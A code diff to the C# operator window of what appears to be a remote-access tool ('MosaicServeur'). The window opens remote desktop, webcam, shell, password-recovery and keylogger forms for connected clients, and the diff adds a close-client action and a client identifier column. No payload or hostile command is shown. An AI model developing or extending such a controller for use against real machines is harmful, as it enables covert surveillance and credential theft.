@@ -29,6 +29,17 @@ namespace MosaicServeur.Main
             clientsCount = 0;
         }
 
+        // MANAGE Event
+
+        private void CloseClientMenuItem(object sender, RoutedEventArgs e)
+        {
+            if(lvClients.Items.Count != 0)
+            {
+                if(getClient() != null)
+                    new Packets.ServerPackets.CloseClient().Execute(getClient());
+            }
+        }
+
         // System Event
         private void SysInfoMenuItem(object sender, RoutedEventArgs e)
         {
@@ -36,7 +47,7 @@ namespace MosaicServeur.Main
             {
                 FrmSystemInformation frmSi = new FrmSystemInformation(getClient());
                 frmSi.Text = SetWindowTitle("Remote Desktop", getClient());
-                frmSi.Show();
+                frmSi.ShowDialog();
                 frmSi.Focus();
             }
         }
@@ -47,7 +58,7 @@ namespace MosaicServeur.Main
             {
                 FrmFileManager frmFm = new FrmFileManager(getClient());
                 frmFm.Text = SetWindowTitle("Remote Desktop", getClient());
-                frmFm.Show();
+                frmFm.ShowDialog();
                 frmFm.Focus();
             }
         }
@@ -58,7 +69,7 @@ namespace MosaicServeur.Main
             {
                 FrmTaskManager frmTm = new FrmTaskManager(getClient());
                 frmTm.Text = SetWindowTitle("Remote Desktop", getClient());
-                frmTm.Show();
+                frmTm.ShowDialog();
                 frmTm.Focus();
             }
         }
@@ -69,7 +80,7 @@ namespace MosaicServeur.Main
             {
                 FrmStartupManager frmSm = new FrmStartupManager(getClient());
                 frmSm.Text = SetWindowTitle("Remote Desktop", getClient());
-                frmSm.Show();
+                frmSm.ShowDialog();
                 frmSm.Focus();
             }
         }
@@ -86,7 +97,7 @@ namespace MosaicServeur.Main
             {
                 FrmRemoteDesktop frmRd = new FrmRemoteDesktop(getClient());
                 frmRd.Text = SetWindowTitle("Remote Desktop", getClient());
-                frmRd.Show();
+                frmRd.ShowDialog();
                 frmRd.Focus();
             }
         }
@@ -97,7 +108,7 @@ namespace MosaicServeur.Main
             {
                 FrmRemoteWebcam frmRw = new FrmRemoteWebcam(getClient());
                 frmRw.Text = SetWindowTitle("Remote Webcam", getClient());
-                frmRw.Show();
+                frmRw.ShowDialog();
                 frmRw.Focus();
             }
         }
@@ -108,7 +119,7 @@ namespace MosaicServeur.Main
             {
                 FrmRemoteShell frmRs = new FrmRemoteShell(getClient());
                 frmRs.Text = SetWindowTitle("Remote Shell", getClient());
-                frmRs.Show();
+                frmRs.ShowDialog();
                 frmRs.Focus();
             }
         }
@@ -119,7 +130,7 @@ namespace MosaicServeur.Main
             {
                 FrmPasswordRecovery frmPr = new FrmPasswordRecovery(getClient());
                 frmPr.Text = SetWindowTitle("Remote Shell", getClient());
-                frmPr.Show();
+                frmPr.ShowDialog();
                 frmPr.Focus();
             }
         }
@@ -130,7 +141,7 @@ namespace MosaicServeur.Main
             {
                 FrmKeyLogger frmKl = new FrmKeyLogger(getClient());
                 frmKl.Text = SetWindowTitle("Remote Shell", getClient());
-                frmKl.Show();
+                frmKl.ShowDialog();
                 frmKl.Focus();
             }
         }
@@ -257,7 +268,7 @@ namespace MosaicServeur.Main
                 {
                     lock (_lockClients)
                     {
-                        lvClients.Items.Add(new ClientRegistration { Ip = client.endPoint.ToString().Split(':')[0], Name = client.value.name, AccType = client.value.accountType,
+                        lvClients.Items.Add(new ClientRegistration { Identifier = client.value.clientIdentifier, Ip = client.endPoint.ToString().Split(':')[0], Name = client.value.name, AccType = client.value.accountType,
                             Country = client.value.country, Os = client.value.operatingSystem, Status = "Connected", Client = client });
                     }
                 }));
@@ -278,12 +289,12 @@ namespace MosaicServeur.Main
                     lock (_lockClients)
                     {
                        for(int i = 0; i < lvClients.Items.Count; i++)
-                        {
+                       {
                             if(client == ((ClientRegistration)lvClients.Items[i]).Client)
                             {
                                 lvClients.Items.RemoveAt(i);
                             }
-                        }
+                       }
                     }
                 }));
             }
